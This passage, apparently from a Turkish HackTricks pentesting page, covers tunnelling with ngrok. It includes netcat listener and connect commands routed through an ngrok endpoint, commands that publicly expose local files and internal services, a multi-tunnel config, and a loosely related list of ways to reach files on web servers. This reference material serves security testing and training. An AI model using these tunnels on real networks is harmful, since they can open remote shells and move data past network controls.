# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### HTTP ile dosyaları açığa çıkarma

HTTP, web sunucuları aracılığıyla dosyalara erişmek için kullanılan bir protokoldür. Bu protokolü kullanarak, hedef sunucudaki dosyalara erişebilir ve bu dosyaları indirebilirsiniz. Aşağıda, HTTP kullanarak dosyaları açığa çıkarmak için kullanılan bazı yöntemler bulunmaktadır:

##### 1. Directory Listing (Dizin Listeleme)

Bir web sunucusunda, dizin listeleme özelliği etkinse, sunucunun kök dizinindeki tüm dosyaları ve alt dizinleri listeleyebilirsiniz. Bu, sunucuda bulunan gizli veya hassas dosyaları keşfetmek için kullanışlı olabilir.

##### 2. File Inclusion (Dosya Dahil Etme)

Bazı web uygulamaları, kullanıcı tarafından belirtilen dosyaları dahil etmek için dinamik olarak dosya yollarını oluşturur. Bu durumda, hedef sunucuda bulunan dosyalara erişmek için bu zafiyeti kullanabilirsiniz.

##### 3. Backup Files (Yedek Dosyalar)

Web sunucularında, yedekleme dosyaları genellikle kök dizinde veya alt dizinlerde bulunur. Bu yedek dosyaları kullanarak, sunucuda bulunan eski veya silinmiş dosyalara erişebilirsiniz.

##### 4. Log Files (Günlük Dosyaları)

Web sunucuları genellikle günlük dosyalarını tutar. Bu günlük dosyaları, sunucuda yapılan işlemleri ve hatta hassas bilgileri içerebilir. Bu dosyaları kullanarak, sunucuda bulunan bilgilere erişebilirsiniz.

##### 5. Configuration Files (Yapılandırma Dosyaları)

Web sunucuları, yapılandırma dosyalarında sunucu ayarlarını ve diğer önemli bilgileri saklar. Bu dosyalara erişerek, sunucunun yapılandırmasını inceleyebilir ve potansiyel zafiyetleri keşfedebilirsiniz.

##### 6. Source Code (Kaynak Kodu)

Bazı durumlarda, web sunucuları kaynak kodlarını sunar. Bu kaynak kodları, web uygulamasının çalışma mantığını ve potansiyel zafiyetleri anlamak için kullanılabilir.

Bu yöntemler, hedef sunucuda bulunan dosyalara erişmek ve potansiyel zafiyetleri keşfetmek için kullanılabilir. Ancak, bu işlemleri gerçekleştirirken yasalara ve etik kurallara uymak önemlidir.
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### HTTP çağrılarını Sniffleme

*XSS, SSRF, SSTI için kullanışlıdır...*
Doğrudan stdout'dan veya HTTP arayüzünde [http://127.0.0.1:4040](http://127.0.0.1:4000) adresinden yapılabilir.

#### İç HTTP servisini Tünelleme
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml basit yapılandırma örneği

3 tünel açar:
- 2 TCP
- /tmp/httpbin/ dizininden statik dosyaların sunumuyla 1 HTTP
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcp
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Kontrol etmek için diğer araçlar

* [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
* [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramanla öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını yapmak** ister misiniz? veya **PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter**'da takip edin 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Hacking hilelerinizi [hacktricks repo'ya](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo'ya](https://github.com/carlospolop/hacktricks-cloud) PR göndererek paylaşın**.

</details>
